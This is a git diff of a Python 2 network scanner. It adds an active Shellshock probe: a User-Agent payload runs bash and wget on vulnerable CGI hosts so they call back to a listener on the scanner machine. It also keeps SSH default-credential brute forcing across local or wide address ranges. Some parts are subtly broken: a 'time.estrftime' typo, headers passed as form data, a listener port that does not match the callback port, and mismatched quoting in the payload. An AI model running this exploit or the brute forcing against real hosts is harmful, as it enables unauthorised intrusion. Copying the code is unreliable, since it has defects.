@@ -56,13 +56,15 @@ _ __|__ _        - Version Info -       _ __|__ _
  - 2/08/18 = v1.5.6 - Scan Improvements       -
  - 2/08/18 = v1.5.7 - Major Bug Fixes         -
  - 2/10/18 = v1.6.0 - Dynamic Scanning        -
+ - 2/18/18 = v1.7.1 - Memory Improvements     -
+ - 2/18/18 = v1.7.2 - Major Bug Fixes         -
  - ?/??/?? = v?.?.? - Honeypot Added          -
  - ?/??/?? = v?.?.? - Speed Tests Added       -
  - ?/??/?? = v?.?.? - More Security Scans     -
 
 _ __|__ _       - Licensing Info -      _ __|__ _
     |                                       |
- 
+
     THE SOFTWARE IS PROVIDED "AS IS", WITHOUT
      WARRANTY OFANY KIND, EXPRESS OR IMPLIED
   INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
@@ -149,6 +151,7 @@ agreement = """
 
 import socket, time, sys, argparse, threading, Queue, logging, random, paramiko, os, requests
 from datetime import datetime
+import string, SocketServer
 
 if sys.platform == "ios":
 	import console
@@ -158,8 +161,10 @@ if "-h" in sys.argv[1:] or "--help" in sys.argv[1:]:
 		sys.exit()
 vulns = {
 	"shellshock":"CVE-2014-6271",
-	"login":"Default Login"
+	"login":"Default Login",
+	"https":"No HTTPS"
 }
+secauth = "DEADBEEF"
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-l","--level",
@@ -193,6 +198,7 @@ parser.add_argument("--ttl",
 	help="Connection Timeout. Default: %(default)s",
 	type=int, default=5)
 args = parser.parse_args()
+socket.setdefaulttimeout(args.ttl)
 
 def loading(rate=0.0007, length=15, msg="", bmsg="", percent=True, amsg="", asyn=False):
 	lchr = u"\u2588"
@@ -219,10 +225,9 @@ def loading(rate=0.0007, length=15, msg="", bmsg="", percent=True, amsg="", asyn
 			time.sleep(rate*random.randint(8,10))
 	time.sleep(rate*50)
 	print
-	return ""
+	return 
 
 class Timer():
-	
 	def __init__(self):
 		self.start = time.time()
 	
@@ -236,13 +241,43 @@ class Timer():
 		time_str = "%02d:%02d:%02d" % (h, m, s)
 		print "..:  Time Elapse  :.." + (" "*9) + "..: %s :.."%time_str
 
+def getauth():
+	globals()["_vdevices"] = []
+	globals()["secauth"] = "".join(random.sample(string.hexdigits.upper()*10,6))
+	return secauth
+
+def shellshock(site, auth=secauth):
+	if "http" not in site:
+		site = "http://"+site
+	conn = requests.session()
+	conf = "() { ignored;};/bin/bash -c 'wget http://%s:%s/%s');'" %(netaddr.localhost, _servport, auth)
+	header = {"Content-type": "application/x-www-form-urlencoded", "User-Agent":conf}
+	res = conn.get(site, data=header, timeout=2)
+	conn.close()
+	return res.status_code
+
+class TCPListen(SocketServer.BaseRequestHandler):
+	def handle(self):
+		data = self.request.recv(1024).strip()
+		if "" in data:
+			del data
+			if self.client_address[0] not in _vdevices:
+				_vdevices.append(self.client_address[0])
+		self.request.sendall("Done.")
+	def log_message(self, format, *args):
+		return 
+
 class radar():
 	
 	def __init__(self):
 		try:
 			self.public = requests.get("http://ip.42.pl/raw",timeout=args.ttl).content
+			if len(self.public) > 15:
+				self.public = "0.0.0.0"
+				print "..: Network :.."+" "*19+"..: OFFLINE :.."
 		except:
 			self.public = "0.0.0.0"
+			print "..: Network :.."+" "*19+"..: OFFLINE :.."
 		if self.public not in os.listdir("./networks"):
 			os.mkdir("./networks/"+self.public)
 			f = open("./networks/"+self.public+"/__init__.py","w")
@@ -265,6 +300,9 @@ class radar():
 		warn2 = "Detected [%s]" %vulns[vuln]
 		warn = warn+(" "*(50-len(warn+warn2)))+warn2
 		logging.warning(warn)
+		if ip+".md" not in os.listdir(tracking.mdir):
+			f = open(tracking.mdir+ip+".md","a")
+			f.close()
 		st = open(tracking.mdir+ip+".md").read().count(vulns[vuln])/2.0
 		if st.is_integer() == True:
 			tracking.vuln(ip,"[%s][%s] *[Vulnerable]*\n***Host is vulnerable to %s***" %(time.strftime("%X %x"), ip, vulns[vuln]))
@@ -278,13 +316,16 @@ class radar():
 		f.close()
 	
 	def autosecure(self, ip, vuln):
+		if ip+".md" not in os.listdir(tracking.mdir):
+			f = open(tracking.mdir+ip+".md","a")
+			f.close()
 		st = open(tracking.mdir+ip+".md").read().count(vulns[vuln])/2.0
 		if st.is_integer() == False:
 			warn = "\r..: %s :.. "%ip
 			warn2 = "Secured [%s]" %vulns[vuln]
 			warn = warn+(" "*(50-len(warn+warn2)))+warn2
 			logging.warning(warn)
-			tracking.vuln(ip,"[%s][%s] *[  Secure  ]*\n***Host has patched %s***" %(time.strftime("%X %x"),ip,vulns[vuln]))
+			tracking.vuln(ip,"[%s][%s] *[  Secure  ]*\n***Host has patched %s***" %(time.estrftime("%X %x"),ip,vulns[vuln]))
 	
 	def update(self, address, stat="Online"):
 		ip = address
@@ -299,15 +340,22 @@ class radar():
 		else:
 			globals()["_firstscan"] = False
 			if args.level == "defcon":
-				ports = portscan(address)
+				try:
+					ports = portscan(address)
+				except:
+					ports = []
 				if len(ports) > 0:
+					np = []
+					for _ in ports:
+						np.append(str(_))
+					ports = np
+					del np
 					f = open(path+ip+".md","a")
 					f.write("[%s][ %s ]\n"%(time.strftime("%X %x")," ".join(ports)))
 					f.close()
-			else:
-				f = open(path+ip+".md","a")
-				f.write("[%s][%s] *[  %s  ]*\n"%(ip, time.strftime("%X %x"),stat))
-				f.close()
+			f = open(path+ip+".md","a")
+			f.write("[%s][%s] *[  %s  ]*\n"%(ip, time.strftime("%X %x"),stat))
+			f.close()
 
 def startup():
 	print scan_banner
@@ -315,8 +363,11 @@ def startup():
 	sys.stdout.write(" "*(21-(len(args.level)+8)))
 	sys.stdout.write("..: %s :..\n"%args.level.upper())
 	time.sleep(0.5)
-	print "..: Mapping Technique :.." + (" "*12) + "..:%s:.."%"THREAD"
-	print "..: Networking Levels :.." + (" "*(18-len(args.network_level))) + "..:%s:.."%args.network_level.upper()
+	if args.level == "defcon":
+		print "..: Mapping Technique :.." + (" "*8) + "..:  %s :.."%"THREAD"
+	else:
+		print "..: Mapping Technique :.." + (" "*8) + "..: %s :.."%"THREAD"
+	print "..: Networking Levels :.." + (" "*(16-len(args.network_level))) + "..: %s :.."%args.network_level.upper()
 	time.sleep(0.1)
 	print "..: Network ID :.." + (" "*20) + "..: N01 :.."
 	time.sleep(1)
@@ -329,6 +380,7 @@ def startup():
 	for _ in loads:
 		loading(0.005, bmsg="..: %s :.. "%_, percent=True, length=28-(len(_)), asyn=" ..: %s :..")
 		time.sleep(0.1)
+	del loads
 
 def print_session():
 	print
@@ -340,41 +392,53 @@ def print_session():
 		"Initializing Scan"
 	]
 	for _ in loads:
-		loading(0.01, bmsg="..: %s :.. "%_, percent=True, length=28-(len(_)), asyn=" ..: %s :..")
+		loading(0.001, bmsg="..: %s :.. "%_, percent=True, length=28-(len(_)), asyn=" ..: %s :..")
 		time.sleep(0.1)
 	scanid = str(stattrack.scanid)
 	while len(scanid) < 3:
 		scanid = "0"+scanid
 	print "..: Scan Identification :.."+(" "*11)+"..: %s :.." %scanid
+	getauth()
+	print "..: Security Auth :.."+(" "*14)+"..: %s :.."%secauth
+	nl = netaddr.localhost
+	print "..: Local Address"+(" "*(24-len(nl)))+"..: "+nl+" :.."
+	time.sleep(2)
 	if "--hd" not in sys.argv:
 		if sys.platform == "ios":
 			print "..: Donate :.."," "*20,
 			sys.stdout.write("..: ")
 			console.write_link("PayPal","https://paypal.me/russianotter")
-			sys.stdout.write(" :..\n")
+			sys.stdout.write(" :..")
+			print
 		else:
 			print "..: Donate :.."," "*3,"https://paypal.me/russianotter"
 	print "_"*6,"_"*41
 
 def makesock(opt=1):
-	if opt == 1:
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-		s.settimeout(args.ttl)
-	if opt == 2:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.settimeout(args.ttl)
-	return s
+	try:
+		if opt == 1:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+			s.settimeout(args.ttl)
+		if opt == 2:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.settimeout(args.ttl)
+		return s
+	except:
+		pass
 
 def connsock():
 	s = socket.create_connection
 	return s
 
 def sshsock():
-	c = paramiko.SSHClient()
-	c.load_system_host_keys()
-	c.set_missing_host_key_policy(paramiko.WarningPolicy())
-	return c
+	try:
+		c = paramiko.SSHClient()
+		c.load_system_host_keys()
+		c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		return c
+	except:
+		pass
 
 def auto_update(ip, nid="", stat="", t="ACTIVE"):
 	if stat == "on":
@@ -420,11 +484,12 @@ class addressing():
 		self.nmax = [1,1,1]
 		try:
 			s = makesock()
+			s.settimeout(5)
 			s.connect(("8.8.8.8", 53))
 			self.localhost = s.getsockname()[0]
+			s.close()
 		except:
 			self.localhost = "0.0.0.0"
-			print "..: Network :.."+" "*10+"..: OFFLINE :.."
 		self.blocal = ".".join(self.localhost.split(".")[:3])+".x"
 		self.bmax = ".".join(self.localhost.split(".")[:1]) + ".%d.%d.%d"
 		if tracking.public not in os.listdir("./networks"):
@@ -484,14 +549,10 @@ class addressing():
 			return address
 		except:
 			return False
-		
-def outer(message, rate=0.0005):
-	for _ in message:
-		sys.stdout.write(_)
-		time.sleep(rate)
 
 def portdetect(ip, port):
 	s = makesock(2)
+	s.settimeout(2)
 	try:
 		v = s.connect_ex((ip,port))
 		if v == 0:
@@ -502,12 +563,12 @@ def portdetect(ip, port):
 		return False
 
 def portscan(ip, rng=[21,22,25,53,80,145,2000,
-8080,443]+list(range(137,140))):
+8080,443,8080]+list(range(137,140))):
 	ports = []
 	for _ in rng:
 		p = portdetect(ip,_)
 		if p:
-			ports.append(str(p))
+			ports.append(p)
 	return ports
 
 class statistics():
@@ -521,15 +582,32 @@ class statistics():
 		self.vuln = 0
 		self.scanid = 0
 	
+	def autoout(self, val):
+		val = str(val)
+		sys.stdout.write("..: ")
+		dist = 11-len(val)
+		for _ in range(dist):
+			sys.stdout.write("-")
+			time.sleep(0.05)
+		for _ in str(val):
+			sys.stdout.write(_)
+			time.sleep(0.1)
+		sys.stdout.write(" :..\r\n")
+		
 	def print_st(self):
 		time.sleep(args.ttl)
 		print
 		print "///Scan Report Diagnostics    ..: Data Logged :.."
-		print "..:  IPs Scanned  :.."+(" "*9)+"..:  %s  :.." %self.totalnodes
-		print "..: Vulnerable IP :.."+(" "*9)+"..:  %s  :.." %self.vuln
-		print "..:  New Devices  :.."+(" "*9)+"..:  %s  :.." %self.new
-		print "..:  Offline IPs  :.."+(" "*9)+"..:  %s  :.." %self.offline
-		print "..:  Active Addr  :.."+(" "*9)+"..:  %s  :.." %self.online
+		print "\r..:  IPs Scanned  :.."+(" "*9),
+		self.autoout(self.totalnodes)
+		print "\r..: Vulnerable IP :.."+(" "*9),
+		self.autoout(self.vuln)
+		print "\r..:  New Devices  :.."+(" "*9),
+		self.autoout(self.new)
+		print "\r..:  Offline IPs  :.."+(" "*9),
+		self.autoout(self.offline)
+		print "\r..:  Active Addr  :.."+(" "*9),
+		self.autoout(self.online)
 		if args.verbose:
 			timekeeper.time()
 		print
@@ -567,20 +645,42 @@ def _drone():
 		except:
 			break
 
+def vulnlog():
+	try:
+		while True:
+			while _inprog == True:
+				pass
+			try:
+				if len(_vdevices) > 0:
+					for _ in _vdevices:
+						if _ != netaddr.localhost:
+							tracking.autovuln(_,"shellshock")
+							_vdevices.pop(_vdevices.index(_))
+			except Exception as e:
+				break
+	except:
+		pass
+
 def start_loggers(bots=1):
-	for _ in range(bots):
+	if "_msgrdrone" not in threading._active:
 		t = threading.Thread(target=_drone)
 		t.daemon = True
+		t.name = "_msgrdrone"
+		t.start()
+	if "_vulnlog" not in threading._active:
+		t = threading.Thread(target=vulnlog)
+		t.daemon = True
+		t.name = "_vulnlog"
 		t.start()
 
 def vulncheck(ip, scanports, state, nid):
 	isvuln1, isvuln2 = False,False
+	lauth = secauth
 	if 80 in scanports:
-		pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]
-		for _ in pages:
+		for _ in ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]:
 			try:
-				if requests.get("http://"+ip+_, timeout=args.ttl).status_code == 200:
-					tracking.autovuln(ip,"shellshock")
+				resp = shellshock(ip+_,lauth)
+				if resp == 200:
 					state = "VULN"
 					isvuln1 = True
 					break
@@ -588,20 +688,29 @@ def vulncheck(ip, scanports, state, nid):
 				pass
 		if not isvuln1:
 			tracking.autosecure(ip,"shellshock")
+		if 443 not in scanports:
+			tracking.autovuln(ip,"https")
+		else:
+			tracking.autosecure(ip,"https")
 	
 	if 22 in scanports:
 		for user in ["admin","root","user","guest"]:
+			if isvuln2:
+				break
 			for pasw in ["password","admin","root"]:
+				if isvuln2:
+					break
 				try:
 					client = sshsock()
 					client.connect(ip, port=22, username=user, password=pasw, timeout=args.ttl)
+					client.close()
 					state = "VULN"
 					isvuln2 = True
 					v = tracking.autovuln(ip,"login")
 					if v:
-						tracking.vuln(ip,"[%s][%s] *[Vulnerable]*\n***Host has default SSH Login Credentials (%s:%s)***" %(time.strftime("%X %x"), ip, user, pasw))
+						tracking.vuln(ip,"***Host has default SSH Login Credentials (%s:%s)***" %(user, pasw))
 					stattrack.vuln += 1
-				except:
+				except Exception as e:
 					pass
 		if not isvuln2:
 			tracking.autosecure(ip,"login")
@@ -614,52 +723,59 @@ def vulncheck(ip, scanports, state, nid):
 		auto_update(ip,nid, stat="off",t=state)
 	elif state == "VULN":
 		q.put(["ip",nid,ip,"VULN","alert"])
-	
 
 def check_node(ip, nid, lvl=args.level):
-	stattrack.totalnodes += 1
-	if lvl == "passive":
-		try:
-			s = connsock()
-			s((ip,80))
-			auto_update(ip,nid,"on",t="HTTP")
-			return True
-		except socket.error as e:
-			if e.errno == 61:
-				auto_update(ip,nid,"on")
+	try:
+		stattrack.totalnodes += 1
+		if lvl == "passive":
+			try:
+				pt,pro = 1,"ACTIVE"
+				if args.verbose:
+					pt,pro = 80,"HTTP"
+				s = connsock()
+				s((ip,pt))
+				auto_update(ip,nid,"on",t=pro)
 				return True
-			elif e.message == "timed out":
-				auto_update(ip,nid, stat="off",t="UNACTIVE")
-			else:
+			except socket.error as e:
+				if e.errno == 61:
+					auto_update(ip,nid,"on")
+					return True
+				elif e.message == "timed out":
+					auto_update(ip,nid, stat="off",t="UNACTIVE")
+				else:
+					return False
+			except:
 				return False
-		except:
-			return False
-	
-	if lvl in ["defcon","security"]:
-		scanports = []
-		state = ""
-		for _ in [22,80]:
+		
+		if lvl in ["defcon","security"]:
+			try:
+				scanports = portscan(ip)
+			except:
+				scanports = []
+			state = ""
 			try:
 				s = connsock()
-				s((ip,_))
-				scanports.append(_)
-				if _ == 80:
-					state = "HTTP"
+				s((ip,80))
+				state = "HTTP"
 			except socket.error as e:
-				if e.errno == 61 and _ == 80:
+				if e.errno == 61:
 					state = "ACTIVE"
-				elif e.message == "timed out" and _ == 80:
+				elif e.message == "timed out":
 					state = "UNACTIVE"
 			except Exception as e:
 				pass
-		t = threading.Thread(target=vulncheck, args=(ip, scanports, state, nid,))
-		t.daemon = True
-		t.start()
+			t = threading.Thread(target=vulncheck, args=(ip, scanports, state, nid,))
+			t.daemon = True
+			t.start()
+	except Exception as e:
+		pass
 
 def scan(setting=args.level):
+	if tracking.public == "0.0.0.0":
+		q.put(["ip"," wan0 ","OFFLINE","WIFI"])
 	while 1:
 		while threading.active_count() > args.maxthread:
-			time.sleep(0.05)
+			pass
 		if args.network_level == "local":
 			ip = netaddr.next_local()
 		elif args.network_level == "max":
@@ -676,12 +792,34 @@ def scan(setting=args.level):
 			time.sleep(0.005)
 	q.join()
 
+def start_server(lhost):
+	globals()["_servport"] = 11337
+	for _ in range(5):
+		try:
+			serv = SocketServer.TCPServer((lhost, 8080), TCPListen)
+			serv.allow_reuse_address = True
+			try:
+				serv.serve_forever()
+			except:
+				serv.server_close()
+				break
+		except Exception as e:
+			pass
+		globals()["_servport"] += _
+
+def toggle():
+	globals()["_inprog"] = not _inprog
+
 if __name__ == "__main__":
-	threadnote = threading.active_count()
-	if threadnote == 1:
-		threadnote += 2
-	else:
-		threadnote += 1
+	globals()["_vdevices"] = []
+	globals()["_inprog"] = False
+	tracking = radar()
+	netaddr = addressing()
+	if "ss_http" not in threading._active:
+		t = threading.Thread(target=start_server, args=(netaddr.localhost,))
+		t.name = "ss_http"
+		t.daemon = True
+		t.start()
 	print head_banner
 	if "recent.md" not in os.listdir("./"):
 		print policy
@@ -703,13 +841,15 @@ _ __|__ _                               _ __|__ _
 	socket.setdefaulttimeout(args.ttl)
 	q = Queue.Queue()
 	startup()
-	start_loggers()
+	threadnote = threading.active_count()
+	if threadnote == 1:
+		threadnote += 1
+	else:
+		threadnote += 2
 	timekeeper = Timer()
-	tracking = radar()
-	netaddr = addressing()
 	stattrack = statistics(netaddr.localhost)
+	start_loggers()
 	while True:
-		tracking = radar()
 		netaddr = addressing()
 		stattrack.scanid += 1
 		if args.auto_clear:
@@ -722,7 +862,9 @@ _ __|__ _                               _ __|__ _
 		print_session()
 		if args.verbose:
 			timekeeper.restart()
+		toggle()
 		scan()
+		toggle()
 		while threading.active_count() > threadnote:
 			time.sleep(0.5)
 		stattrack.print_st()
@@ -730,7 +872,7 @@ _ __|__ _                               _ __|__ _
 		end = time.time()+60*args.rate
 		while time.time() < end:
 			try:
-				time.sleep(0.5)
+				pass
 			except:
 				print "..: Scanning Successfully Stopped :.."
 				q.put("exit")
